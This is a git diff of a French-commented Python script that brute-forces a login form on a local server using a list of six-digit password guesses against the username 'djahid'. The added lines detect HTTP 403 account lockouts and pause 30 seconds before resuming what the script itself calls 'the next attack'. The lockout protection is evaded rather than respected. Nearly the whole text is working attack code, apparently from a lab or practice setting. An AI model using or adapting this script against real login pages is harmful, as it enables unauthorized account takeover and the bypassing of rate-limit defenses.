@@ -7,7 +7,7 @@ url = 'http://127.0.0.1:8000/'
 
 
 
-username = 'test@example.com'  
+username = 'djahid'  
 resultats = ['111111','000354','444333','999999','123456','654321']
 # Créer une session
 session = requests.Session()
@@ -30,6 +30,10 @@ def try_password(password):
     }
     # Envoyer la requête POST au serveur
     response = session.post(url, data=data, headers=headers)
+    if response.status_code == 403:
+            print("le compte A ete blocker wait 30 seconde pour la prochaine attaque")
+            time.sleep(30)  # Attente de 30 secondes 
+            return False  # Retourne False pour indiquer l'échec de la tentative
     #response = requests.post(url, data=data, headers=headers)
     if "Login successful!" in response.text:
         print(f"Connexion réussie avec : {username} / {password}")
